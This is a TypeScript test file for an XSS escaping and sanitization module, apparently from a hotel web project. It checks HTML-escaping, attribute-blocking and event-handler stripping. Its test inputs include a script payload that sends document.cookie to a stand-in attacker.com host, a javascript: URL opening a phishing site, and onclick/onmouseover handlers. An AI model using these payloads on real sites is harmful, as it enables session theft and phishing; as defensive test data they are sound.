import { describe, it } from "node:test";
import assert from "node:assert";
import escapeHtml, { escapeHtmlAttribute, sanitizeInput, sanitizeTemplateContext } from "../../validators/xssProtection.ts";

describe("Vitest/TS: XSS Escaping & Sanitization", () => {
  it("escapes all dangerous HTML characters conforming to escape-html spec", () => {
    const raw = `&<>"'/=\``;
    const escaped = escapeHtml(raw);

    assert.strictEqual(escaped, "&amp;&lt;&gt;&quot;&#39;&#x2F;&#x3D;&#96;");
  });

  it("neutralizes script injection attempts in HTML text", () => {
    const attack = `<script>document.location='http://attacker.com/steal?c='+document.cookie</script>`;
    const safe = escapeHtml(attack);

    assert(!safe.includes("<script>"));
    assert(safe.startsWith("&lt;script&gt;"));
  });

  it("blocks javascript: and data: pseudo-protocols in attribute values", () => {
    const dangerousAttr = 'javascript:void(window.open("http://phishing.com"))';
    const safeAttr = escapeHtmlAttribute(dangerousAttr);

    assert(!safeAttr.startsWith("javascript:"));
    assert(safeAttr.includes("blocked-javascript:"));
  });

  it("strips event handlers and malicious tags from rich text input", () => {
    const dirty = '<a href="https://example.com" onclick="stealData()" onmouseover="alert(1)">Click Me</a>';
    const cleaned = sanitizeInput(dirty);

    assert(!cleaned.includes("onclick"));
    assert(!cleaned.includes("onmouseover"));
    assert(cleaned.includes("Click Me"));
  });

  it("recursively sanitizes complex template contexts", () => {
    const context = {
      hotel: "<b>Grand</b>",
      tags: ["<i>Luxury</i>", "<span>Suites</span>"],
      meta: {
        raw: '"Dangerous"'
      }
    };
    const sanitized = sanitizeTemplateContext(context);

    assert.strictEqual(sanitized.hotel, "&lt;b&gt;Grand&lt;&#x2F;b&gt;");
    assert.strictEqual(sanitized.tags[0], "&lt;i&gt;Luxury&lt;&#x2F;i&gt;");
    assert.strictEqual(sanitized.meta.raw, "&quot;Dangerous&quot;");
  });
});
